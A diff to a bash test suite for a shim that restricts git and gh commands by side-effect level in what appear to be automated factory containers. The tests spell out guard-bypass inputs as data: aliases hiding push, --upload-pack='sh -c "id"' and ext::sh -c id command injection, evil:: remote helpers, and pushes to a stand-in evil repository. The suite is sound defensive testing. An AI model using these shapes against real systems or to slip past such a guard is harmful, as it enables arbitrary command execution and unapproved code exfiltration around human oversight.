@@ -40,22 +40,80 @@ python3() {
 export -f python3
 export STUB_LOG
 
+# #553: the shims now ask real git/gh what a verb resolves to (aliases, push URLs,
+# extensions), so the stubs hand exactly those read-only lookups to the real binaries --
+# found on PATH, skipping any side-effect shim (this script also runs inside factory
+# containers, where the shim is first on PATH) -- and echo every other call as before.
+_find_real() {
+  local p
+  for p in $(type -ap "$1"); do
+    grep -q "side-effect guard" "$p" 2>/dev/null || { echo "$p"; return 0; }
+  done
+  return 1
+}
+REAL_GIT_BIN=$(_find_real git) || { echo "FAIL: no real git on PATH"; exit 1; }
+REAL_GH_BIN=$(_find_real gh) || { echo "FAIL: no real gh on PATH"; exit 1; }
+
 # Real binary stubs the shim must exec through when allowed.
 mkdir -p "$TMP/real"
-cat > "$TMP/real/git" <<'EOF'
+cat > "$TMP/real/git" <<EOF
 #!/usr/bin/env bash
-echo "REAL_GIT $*"
+args=("\$@"); i=0
+while [ "\$i" -lt "\${#args[@]}" ]; do
+  case "\${args[\$i]}" in
+    --list-cmds=*) exec "$REAL_GIT_BIN" "\$@" ;;
+    -C|-c|--git-dir|--work-tree|--namespace|--config-env) i=\$((i + 2)) ;;
+    -*) i=\$((i + 1)) ;;
+    *) break ;;
+  esac
+done
+case "\${args[\$i]:-} \${args[\$((i + 1))]:-}" in
+  "config "*|"remote get-url"|"symbolic-ref "*) exec "$REAL_GIT_BIN" "\$@" ;;
+esac
+echo "REAL_GIT \$*"
 EOF
-cat > "$TMP/real/gh" <<'EOF'
+cat > "$TMP/real/gh" <<EOF
 #!/usr/bin/env bash
-echo "REAL_GH $*"
+case "\${1:-} \${2:-}" in
+  "alias list"|"extension list") exec "$REAL_GH_BIN" "\$@" ;;
+esac
+echo "REAL_GH \$*"
 EOF
 chmod +x "$TMP/real/git" "$TMP/real/gh"
 
 SHIM_DIR="$REPO_ROOT/scripts/shims"
 export PATH="$SHIM_DIR:$TMP/real:$PATH"
 
+# #553 fixture: a real repo whose origin is the run's repository (o/r), so the level-4
+# push-destination check has something to resolve, independent of the checkout this
+# test runs from. No developer/runner config, gh alias, extension, token or SSH
+# override leaks in.
+export GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1
+export GH_CONFIG_DIR="$TMP/gh-config" XDG_DATA_HOME="$TMP/xdg-data"
+mkdir -p "$GH_CONFIG_DIR" "$XDG_DATA_HOME"
+unset GH_TOKEN GITHUB_TOKEN GIT_SSH GIT_SSH_COMMAND GIT_ALLOW_PROTOCOL GIT_PROXY_COMMAND GIT_EXEC_PATH GIT_CONFIG GIT_CONFIG_COUNT \
+  GIT_CONFIG_PARAMETERS GIT_DIR GIT_WORK_TREE || true
+export FACTORY_REPO_SLUG=o/r
+"$REAL_GIT_BIN" init -q -b feat "$TMP/repo"
+"$REAL_GIT_BIN" -C "$TMP/repo" remote add origin https://github.com/o/r.git
+cd "$TMP/repo"
+
 PASS=0; FAIL=0
+check_deny_reason() {
+  # usage: check_deny_reason <ERE the deny message must match> <cmd...> -- #553: a new
+  # deny case must be denied for its own reason, not by some unrelated check.
+  local re="$1"; shift
+  local out rc
+  set +e
+  out=$("$@" 2>&1)
+  rc=$?
+  set -e
+  if [ "$rc" != "0" ] && echo "$out" | grep -q "side-effect guard" && echo "$out" | grep -qE -- "$re"; then
+    PASS=$((PASS+1))
+  else
+    echo "FAIL (expected deny /$re/): $* -> rc=$rc out=$out"; FAIL=$((FAIL+1))
+  fi
+}
 check() {
   # usage: check <allow|deny> <cmd...>   e.g. check allow git log
   local expect="$1"; shift
@@ -242,6 +300,249 @@ FACTORY_SIDE_EFFECT_LEVEL=5 check deny  gh auth login
 FACTORY_SIDE_EFFECT_LEVEL=5 check deny  gh api repos/o/r -X DELETE
 FACTORY_SIDE_EFFECT_LEVEL=5 check allow gh repo view o/r
 
+# --- #553: alias, env-config, transport-override and destination bypass shapes ---
+# Every new deny asserts its reason (check_deny_reason), so a case cannot pass because an
+# unrelated check denied it. All run in the $TMP/repo fixture (origin = o/r, branch feat).
+export FACTORY_RUN_BRANCH="feat"
+# Alias sources: however the alias is defined, `p` is judged as `push` (level 2 denies push).
+FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "'push' is denied" git -c alias.p=push p origin HEAD
+"$REAL_GIT_BIN" config alias.pp push
+FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "'push' is denied" git pp origin HEAD
+"$REAL_GIT_BIN" config --unset alias.pp
+GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.p GIT_CONFIG_VALUE_0=push \
+  FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "'push' is denied" git p origin HEAD
+GIT_CONFIG_PARAMETERS="'alias.p'='push'" \
+  FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "'push' is denied" git p origin HEAD
+printf '[alias]\n\tp = push\n' > "$TMP/alias.gitconfig"
+GIT_CONFIG_GLOBAL="$TMP/alias.gitconfig" \
+  FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "'push' is denied" git p origin HEAD
+ALIAS_VALUE=push FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "'push' is denied" \
+  git --config-env=alias.ce=ALIAS_VALUE ce origin HEAD
+FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "'push' is denied" \
+  git -c alias.a1=a2 -c alias.a2=push a1 origin HEAD
+# GIT_CONFIG redirects only `git config` itself: a decoy file must not hide the real alias.
+printf '[alias]\n\tp = log\n' > "$TMP/decoy.gitconfig"
+GIT_CONFIG="$TMP/decoy.gitconfig" \
+  FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "'push' is denied" git -c alias.p=push p origin HEAD
+# The classify-only marker is the shim's own; from the caller's environment it is denied.
+SIDE_EFFECT_SHIM_CLASSIFY_ONLY=1 FACTORY_SIDE_EFFECT_LEVEL=5 \
+  check_deny_reason "outside a nested check" git status
+# Depth cap: five hops resolve, six deny.
+FACTORY_SIDE_EFFECT_LEVEL=5 check allow git -c alias.h1=h2 -c alias.h2=h3 -c alias.h3=h4 \
+  -c alias.h4=h5 -c alias.h5=status h1
+FACTORY_SIDE_EFFECT_LEVEL=5 check_deny_reason "too deep" git -c alias.h1=h2 -c alias.h2=h3 \
+  -c alias.h3=h4 -c alias.h4=h5 -c alias.h5=h6 -c alias.h6=status h1
+# Shell aliases are unclassifiable -- denied at every level.
+FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "shell alias" git -c 'alias.s=!git push origin HEAD' s
+FACTORY_SIDE_EFFECT_LEVEL=5 check_deny_reason "shell alias" git -c 'alias.s=!git push --delete origin feat' s
+# Arguments inside the alias value are judged too.
+FACTORY_SIDE_EFFECT_LEVEL=5 check_deny_reason "push --delete" git -c 'alias.del=push --delete' del origin feat
+FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "push --force" git -c 'alias.x=push --force' x origin feat
+FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "push \(main\)" git -c 'alias.x=push origin' x HEAD:main
+# Tighten-only: the literal form is still judged first (`l` is not on level 1's allow-list).
+FACTORY_SIDE_EFFECT_LEVEL=1 check_deny_reason "'l' is denied" git -c alias.l=log l
+FACTORY_SIDE_EFFECT_LEVEL=1 check_deny_reason "'l' is denied" git -c 'alias.l=log --output=f' l
+# Alias values that are not a bare verb.
+FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "'push' is denied" git -c 'alias.v=-p push' v origin HEAD
+FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "shell-style parsing" git -c 'alias.w="push"' w origin HEAD
+# Global options the skip-loop does not know are denied, not read as the verb.
+FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "unrecognised option" git --no-advice push origin HEAD
+FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "unrecognised option" git --attr-source HEAD push origin HEAD
+FACTORY_SIDE_EFFECT_LEVEL=5 check_deny_reason "unrecognised option" git --no-advice status
+FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "'push' is denied" git -C . --git-dir=.git --no-pager push origin HEAD
+FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "push --force" git push -fu origin feat
+# Unknown verbs and external git-<verb> commands. (git-lfs is preinstalled on GitHub's
+# ubuntu runners but not in the factory image, so `lfs` may surface as either reason.)
+FACTORY_SIDE_EFFECT_LEVEL=5 check_deny_reason "unknown verb" git frobnicate
+FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "unknown verb|external git command" git lfs push origin feat
+mkdir -p "$TMP/ext-bin"
+printf '#!/bin/sh\necho EXTERNAL "$@"\n' > "$TMP/ext-bin/git-evilx"; chmod +x "$TMP/ext-bin/git-evilx"
+PATH="$SHIM_DIR:$TMP/ext-bin:$TMP/real:$PATH" FACTORY_SIDE_EFFECT_LEVEL=2 \
+  check_deny_reason "external git command" git -c alias.evilx=status evilx
+FACTORY_SIDE_EFFECT_LEVEL=5 check allow git submodule status
+# Controls: legitimate aliases and global options keep working.
+FACTORY_SIDE_EFFECT_LEVEL=5 check allow git -c alias.p=push p origin feat
+FACTORY_SIDE_EFFECT_LEVEL=5 check allow git -c 'alias.lg=log --oneline' lg
+FACTORY_SIDE_EFFECT_LEVEL=5 check allow git -c alias.status=push status   # a known verb never resolves
+FACTORY_SIDE_EFFECT_LEVEL=2 check allow git -C . -c user.name=x commit -m x
+FACTORY_SIDE_EFFECT_LEVEL=2 check allow git --no-pager -C . diff --name-only
+FACTORY_SIDE_EFFECT_LEVEL=2 check allow git --git-dir=.git status
+# Transport-command overrides: denied at every level, whatever the source.
+FACTORY_SIDE_EFFECT_LEVEL=5 check_deny_reason "sshCommand" git -c core.sshCommand=x push origin feat
+GIT_SSH_COMMAND=x FACTORY_SIDE_EFFECT_LEVEL=5 check_deny_reason "sshCommand" git fetch origin
+GIT_SSH=x FACTORY_SIDE_EFFECT_LEVEL=1 check_deny_reason "sshCommand" git fetch origin
+GIT_CONFIG=/dev/null FACTORY_SIDE_EFFECT_LEVEL=5 check_deny_reason "sshCommand" \
+  git -c core.sshCommand=x fetch origin
+# Not only the classic transport verbs: archive --remote and maintenance prefetch open one too.
+FACTORY_SIDE_EFFECT_LEVEL=5 check_deny_reason "sshCommand" \
+  git -c core.sshCommand=x archive --remote=ssh://h/x HEAD
+GIT_SSH_COMMAND=x FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "sshCommand" \
+  git maintenance run --task=prefetch
+# Gate 3 on PR #569 (high): the helper program a transport runs is an override too --
+# `ls-remote --upload-pack='sh -c ...'` ran an arbitrary command at level 2.
+FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "transport command override" \
+  git ls-remote --upload-pack='sh -c "id"' .
+FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "transport command override" git ls-remote --upload-pack x .
+FACTORY_SIDE_EFFECT_LEVEL=1 check_deny_reason "transport command override" git fetch --upload-pack=x origin
+FACTORY_SIDE_EFFECT_LEVEL=5 check_deny_reason "transport command override" git pull --upload-pack=x origin
+FACTORY_SIDE_EFFECT_LEVEL=5 check_deny_reason "transport command override" git clone --upload-pack=x . d
+FACTORY_SIDE_EFFECT_LEVEL=5 check_deny_reason "transport command override" git push --receive-pack=x origin feat
+FACTORY_SIDE_EFFECT_LEVEL=5 check_deny_reason "transport command override" git push --exec=x origin feat
+FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "transport command override" git ls-remote --exec=x .
+FACTORY_SIDE_EFFECT_LEVEL=5 check_deny_reason "transport command override" git archive --exec=x --remote=. HEAD
+# git accepts any unambiguous prefix of a long option.
+FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "transport command override" git ls-remote --upload-pa=x .
+FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "transport command override" git ls-remote --u=x .
+FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "transport command override" git ls-remote --exe=x .
+FACTORY_SIDE_EFFECT_LEVEL=5 check_deny_reason "transport command override" git push --rece=x origin feat
+FACTORY_SIDE_EFFECT_LEVEL=5 check_deny_reason "transport command override" git push --e=x origin feat
+# Short form, alone, clustered or with a glued value -- only where -u means upload-pack.
+FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "transport command override" git ls-remote -u x .
+FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "transport command override" git ls-remote -qu x .
+FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "transport command override" git ls-remote -ux .
+FACTORY_SIDE_EFFECT_LEVEL=5 check_deny_reason "transport command override" git clone -u x . d
+# The same override from config, and through an alias.
+FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "transport command override" \
+  git -c remote.origin.uploadpack=x fetch origin
+FACTORY_SIDE_EFFECT_LEVEL=5 check_deny_reason "transport command override" \
+  git -c remote.origin.receivepack=x push origin feat
+FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "transport command override" \
+  git -c 'alias.lr=ls-remote --upload-pack=x' lr .
+FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "transport command override" git -c core.gitProxy=x fetch origin
+GIT_PROXY_COMMAND=x FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "transport command override" git fetch origin
+# ext:: runs its address as a command; git refuses it unless the protocol policy is opened.
+FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "protocol policy override" \
+  git -c protocol.ext.allow=always ls-remote 'ext::sh -c id'
+FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "protocol policy override" git -c protocol.ext.allow=user status
+FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "protocol policy override" git -c protocol.allow=always fetch origin
+GIT_ALLOW_PROTOCOL=ext FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "protocol policy override" git fetch origin
+FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "ext:: transport" git ls-remote 'ext::sh -c id'
+FACTORY_SIDE_EFFECT_LEVEL=5 check_deny_reason "ext:: transport" git fetch 'ext::sh -c id' main
+FACTORY_SIDE_EFFECT_LEVEL=5 check_deny_reason "ext:: transport" git archive '--remote=ext::sh -c id' HEAD
+FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "ext:: transport" \
+  git -c 'remote.origin.url=ext::sh -c id' fetch origin
+# Controls: -u keeps its other meanings, rebase --exec is #565's, never is the default.
+FACTORY_SIDE_EFFECT_LEVEL=5 check allow git push -u origin feat
+FACTORY_SIDE_EFFECT_LEVEL=2 check allow git add -u
+FACTORY_SIDE_EFFECT_LEVEL=2 check allow git commit -uno -m x
+FACTORY_SIDE_EFFECT_LEVEL=2 check allow git fetch -u origin
+FACTORY_SIDE_EFFECT_LEVEL=2 check allow git ls-remote --heads origin
+FACTORY_SIDE_EFFECT_LEVEL=5 check allow git push --recurse-submodules=check origin feat
+FACTORY_SIDE_EFFECT_LEVEL=2 check allow git diff --exit-code
+FACTORY_SIDE_EFFECT_LEVEL=2 check allow git rebase --exec true main
+FACTORY_SIDE_EFFECT_LEVEL=2 check allow git -c protocol.ext.allow=never fetch origin
+FACTORY_SIDE_EFFECT_LEVEL=2 check allow git grep 'std::string'
+# Operator review of 62efc98: the helper programs themselves. --exec-path/GIT_EXEC_PATH
+# swap the directory git-remote-https is loaded from; remote-ext run directly executes its
+# address; `<helper>::<address>` loads git-remote-<helper> from PATH.
+FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "exec-path override" git --exec-path=/tmp/e ls-remote https://h/x
+# Without `=` git only prints its exec-path; denied all the same (by whichever check sees it first).
+FACTORY_SIDE_EFFECT_LEVEL=4 check deny git --exec-path /tmp/e ls-remote https://h/x
+GIT_EXEC_PATH=/tmp/e FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "exec-path override" git ls-remote https://h/x
+FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "remote helper" git remote-ext o 'sh -c id'
+FACTORY_SIDE_EFFECT_LEVEL=5 check_deny_reason "remote helper" git remote-fd o 3
+FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "remote helper" git remote-https o https://h/x
+FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "remote helper" git -c alias.rx=remote-ext rx o 'sh -c id'
+FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "remote helper address" git ls-remote 'evil::x'
+FACTORY_SIDE_EFFECT_LEVEL=5 check_deny_reason "remote helper address" git fetch 'evil::x' main
+FACTORY_SIDE_EFFECT_LEVEL=5 check_deny_reason "remote helper address" git clone 'evil::x' d
+FACTORY_SIDE_EFFECT_LEVEL=5 check_deny_reason "remote helper address" git archive --remote=evil::x HEAD
+FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "remote helper address" \
+  git -c remote.origin.url=evil::x fetch origin
+FACTORY_SIDE_EFFECT_LEVEL=2 check_deny_reason "remote helper address" \
+  git -c url.evil::x.insteadOf=https://github.com/ fetch origin
+FACTORY_SIDE_EFFECT_LEVEL=2 check allow git commit -m 'scope::thing'
+FACTORY_SIDE_EFFECT_LEVEL=2 check allow git log --grep 'a::b'
+FACTORY_SIDE_EFFECT_LEVEL=5 check allow git push origin feat
+FACTORY_SIDE_EFFECT_LEVEL=1 check allow git fetch origin
+# Push destination at level 4: every push URL must be the run's repository (o/r).
+FACTORY_SIDE_EFFECT_LEVEL=4 check allow git push origin feat
+FACTORY_SIDE_EFFECT_LEVEL=4 check allow git push https://github.com/o/r.git feat
+FACTORY_SIDE_EFFECT_LEVEL=4 check allow git push --repo=origin
+FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "not the run's repository" \
+  git push https://github.com/evil/x.git feat
+FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "not the run's repository" \
+  git -c remote.origin.pushurl=https://github.com/evil/x.git push origin feat
+FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "not the run's repository" \
+  git -c url.https://github.com/evil/.insteadOf=https://github.com/o/ push origin feat
+FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "not the run's repository" \
+  git -c remote.origin.pushurl=https://github.com/o/r.git \
+  -c remote.origin.pushurl=https://github.com/evil/x.git push origin feat
+FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "not the run's repository" \
+  git push --repo=https://github.com/evil/x.git
+FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "not the run's repository" \
+  git -c remote.pushDefault=evil -c remote.evil.url=https://github.com/evil/x.git push
+FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "URL rewrite" \
+  git -c url.https://github.com/evil/.insteadOf=https://nowhere.example/ \
+  push https://github.com/o/r.git feat
+"$REAL_GIT_BIN" remote add evil https://github.com/evil/x.git
+FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "not the run's repository" git push evil feat
+FACTORY_SIDE_EFFECT_LEVEL=5 check allow git -c remote.origin.pushurl=https://github.com/evil/x.git push origin feat
+# Fallback baseline (no FACTORY_REPO_SLUG): origin's persisted URL.
+FACTORY_REPO_SLUG= FACTORY_SIDE_EFFECT_LEVEL=4 check allow git push origin feat
+FACTORY_REPO_SLUG= FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "not the run's repository" \
+  git -c remote.origin.pushurl=https://github.com/evil/x.git push origin feat
+FACTORY_REPO_SLUG= FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "not the run's repository" \
+  git push https://github.com/evil/x.git feat
+FACTORY_REPO_SLUG= FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "not the run's repository" git push evil feat
+"$REAL_GIT_BIN" remote remove evil
+# gh aliases (no token in the environment): judged as their expansion, tighten-only.
+"$REAL_GH_BIN" alias set p 'pr create' >/dev/null 2>&1
+"$REAL_GH_BIN" alias set xs secret >/dev/null 2>&1
+"$REAL_GH_BIN" alias set il 'issue list' >/dev/null 2>&1
+"$REAL_GH_BIN" alias set --shell sh 'gh pr create' >/dev/null 2>&1
+FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "pr create" gh p --title x --body y
+FACTORY_SIDE_EFFECT_LEVEL=5 check allow gh p --title x --body y
+FACTORY_SIDE_EFFECT_LEVEL=1 check_deny_reason "secret list" gh xs list
+FACTORY_SIDE_EFFECT_LEVEL=1 check_deny_reason "'il' is denied" gh il
+FACTORY_SIDE_EFFECT_LEVEL=3 check_deny_reason "'il' is denied" gh il
+FACTORY_SIDE_EFFECT_LEVEL=4 check allow gh il
+FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "shell alias|shell-style parsing" gh sh
+SIDE_EFFECT_SHIM_CLASSIFY_ONLY=1 FACTORY_SIDE_EFFECT_LEVEL=5 \
+  check_deny_reason "outside a nested check" gh pr view 1
+# gh extensions: denied at levels 1-4, unchanged at 5.
+mkdir -p "$XDG_DATA_HOME/gh/extensions/gh-someext"
+printf '#!/bin/sh\necho SOMEEXT "$@"\n' > "$XDG_DATA_HOME/gh/extensions/gh-someext/gh-someext"
+chmod +x "$XDG_DATA_HOME/gh/extensions/gh-someext/gh-someext"
+FACTORY_SIDE_EFFECT_LEVEL=1 check_deny_reason "\(extension\)" gh someext list
+FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "\(extension\)" gh someext
+FACTORY_SIDE_EFFECT_LEVEL=5 check allow gh someext
+FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "extension install" gh extension install o/x
+FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "extension install" gh ext install o/x
+FACTORY_SIDE_EFFECT_LEVEL=5 check allow gh extension install o/x
+FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "flag before" gh -R o/r pr create
+# Item 8 regression pin: a body with no -X is a POST.
+FACTORY_SIDE_EFFECT_LEVEL=4 check_deny_reason "api POST" gh api repos/o/r/issues -f title=x
+# Legitimate factory usage still passes with no token.
+FACTORY_SIDE_EFFECT_LEVEL=3 check allow gh issue comment 1 --body hi
+FACTORY_SIDE_EFFECT_LEVEL=3 check allow gh issue view 1
+FACTORY_SIDE_EFFECT_LEVEL=3 check allow gh issue create --title x
+FACTORY_SIDE_EFFECT_LEVEL=3 check allow gh issue edit 1 --add-label x
+FACTORY_SIDE_EFFECT_LEVEL=1 check allow gh pr view 1
+FACTORY_SIDE_EFFECT_LEVEL=1 check allow gh pr list
+FACTORY_SIDE_EFFECT_LEVEL=1 check allow gh api repos/o/r
+FACTORY_SIDE_EFFECT_LEVEL=4 check allow gh pr view 1
+FACTORY_SIDE_EFFECT_LEVEL=5 check allow gh pr create
+FACTORY_SIDE_EFFECT_LEVEL=5 check allow gh api graphql -f query=x
+
+# Known-verb pin (spec operator decision 2): every git verb the factory's own commands,
+# refinement skills, scripts, entrypoint and workflows invoke must be in git's known-verb
+# set, or the shim would deny it. Pinned, not grepped at test time (prose such as "git
+# reports" would make a live grep flaky); rebuilt from:
+#   grep -rhoE '\bgit (-C [^ ]+ )?[a-z][a-z-]+' commands/ refinement-skills/ scripts/ \
+#     entrypoint.sh workflows/*.yaml | awk '{print $NF}' | sort -u   (then hand-pruned)
+_KNOWN_VERBS=$("$REAL_GIT_BIN" --list-cmds=main)
+for v in add apply blame branch cat-file check-ignore checkout clean clone commit config diff diff-tree fetch \
+    for-each-ref grep log ls-files ls-remote merge merge-base mv pull push rebase remote reset \
+    rev-list rev-parse rm show stash status symbolic-ref update-index write-tree; do
+  if grep -qxF -- "$v" <<<"$_KNOWN_VERBS"; then
+    PASS=$((PASS+1))
+  else
+    echo "FAIL: factory git verb '$v' is not in git --list-cmds=main"; FAIL=$((FAIL+1))
+  fi
+done
+# --- end #553 cases ---
+unset FACTORY_RUN_BRANCH
 # --- Health-event emission on denial (R5's {tool, verb, level} audit line) ---
 # The blocks above never set ARTIFACTS_DIR, so _emit_denied's early
 # `[ -n "$artdir" ] || return 0` guard always short-circuits there and the python3()
